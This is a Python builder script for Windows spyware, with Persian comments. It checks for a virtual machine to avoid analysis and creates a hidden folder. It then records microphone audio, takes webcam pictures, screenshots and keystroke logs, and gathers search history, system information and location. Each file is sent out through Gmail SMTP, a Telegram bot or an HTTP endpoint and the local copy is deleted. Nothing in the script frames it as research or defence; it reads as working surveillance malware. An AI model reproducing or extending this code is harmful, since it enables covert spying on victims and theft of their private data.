# Builder.py
import os
import sys
import shutil
import smtplib
import requests
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO

# ماژول‌های داخلی پروژه
import VM_Checker
import Voice
import Camera
import winsploit
import Histroy_Search
import Information
import Location
import screen
import Keystrokes

BASE_DIR = r"C:\TEMP1"


HARDCODE_CONFIG = {'method': 'email', 'sender': 'ي1ش', 'password': 'ي1ش', 'receiver': 'ي1'}



class credentials:
    def __init__(self):
        self.method = None
        self.config = {}

    def Choice_Method_to_send(self):
        global HARDCODE_CONFIG
        if HARDCODE_CONFIG:
            self.method = HARDCODE_CONFIG["method"]
            self.config = HARDCODE_CONFIG.copy()
            print(f"[+] Using saved method: {self.method}")
        else:
            print("[-] No config found!")
            sys.exit()

    def send_text(self, subject, body):
        if self.method == "email":
            msg = MIMEText(body, "plain")
            msg["Subject"] = subject
            msg["From"] = self.config["sender"]
            msg["To"] = self.config["receiver"]
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.config["sender"], self.config["password"])
                server.sendmail(self.config["sender"], self.config["receiver"], msg.as_string())
        elif self.method == "telegram":
            url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendMessage"
            requests.post(url, data={"chat_id": self.config["chat_id"], "text": body})
        elif self.method == "server":
            requests.post(self.config["url"], files={"subject": subject, "body": body})

    def send_file(self, filepath, subject="File"):
        if not os.path.exists(filepath):
            return
        if self.method == "email":
            msg = MIMEMultipart()
            msg["Subject"] = subject
            msg["From"] = self.config["sender"]
            msg["To"] = self.config["receiver"]
            part = MIMEBase("application", "octet-stream")
            part.set_payload(open(filepath, "rb").read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(filepath)}")
            msg.attach(part)
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                server.login(self.config["sender"], self.config["password"])
                server.sendmail(self.config["sender"], self.config["receiver"], msg.as_string())
        elif self.method == "telegram":
            url = f"https://api.telegram.org/bot{self.config['bot_token']}/sendDocument"
            requests.post(url, data={"chat_id": self.config["chat_id"]}, files={"document": open(filepath,"rb")})
        elif self.method == "server":
            requests.post(self.config["url"], files={"file": open(filepath,"rb")})


def make_hidden_folder(path):
    if not os.path.exists(path):
        os.makedirs(path)
        os.system(f'attrib +h "{path}"')


def run_all(sender):
    try:
        audio_bytes = Voice.Sound_Voice.record_system_audio(duration=10)
        audio_path = os.path.join(BASE_DIR, "audio.wav")
        with open(audio_path, "wb") as f:
            f.write(audio_bytes)
        sender.send_file(audio_path)
        os.remove(audio_path)
    except: pass

    try:
        cam = Camera.Camera_()
        pic_path = cam.get_picture(BASE_DIR)
        sender.send_file(pic_path)
        os.remove(pic_path)
    except: pass

    try:
        history_file = os.path.join(BASE_DIR, "search.txt")
        Histroy_Search.get_history_search.run_search_history(BASE_DIR, "search.txt")
        sender.send_file(history_file)
        os.remove(history_file)
    except: pass

    try:
        info = Information.information()
        info.information_()
        info_file = os.path.join("C:\\TEMP1", "information.txt")
        if os.path.exists(info_file):
            shutil.move(info_file, os.path.join(BASE_DIR, "information.txt"))
            sender.send_file(os.path.join(BASE_DIR, "information.txt"))
            os.remove(os.path.join(BASE_DIR, "information.txt"))
    except: pass

    try:
        loc = Location.Request_Location()
        loc.Location()
        loc_file = os.path.join("C:\\TEMP1", "location.txt")
        if os.path.exists(loc_file):
            shutil.move(loc_file, os.path.join(BASE_DIR, "location.txt"))
            sender.send_file(os.path.join(BASE_DIR, "location.txt"))
            os.remove(os.path.join(BASE_DIR, "location.txt"))
    except: pass

    try:
        ss = screen.ScreenShotFile()
        byte_img = ss.Scree_Shot()
        if byte_img:
            ss_path = os.path.join(BASE_DIR, "screenshot.png")
            with open(ss_path, "wb") as f:
                f.write(byte_img.getvalue())
            sender.send_file(ss_path)
            os.remove(ss_path)
    except: pass

    try:
        gk = Keystrokes.get_key()
        gk.start()
        log_path = os.path.join("C:\\Temp", "logs.txt")
        if os.path.exists(log_path):
            shutil.move(log_path, os.path.join(BASE_DIR, "logs.txt"))
            sender.send_file(os.path.join(BASE_DIR, "logs.txt"))
            os.remove(os.path.join(BASE_DIR, "logs.txt"))
    except: pass


def main():
    vm_checker = VM_Checker.CheckVM()
    if vm_checker.is_vm():
        return

    make_hidden_folder(BASE_DIR)
    sender = credentials()
    sender.Choice_Method_to_send()
    run_all(sender)


if __name__ == "__main__":
    main()
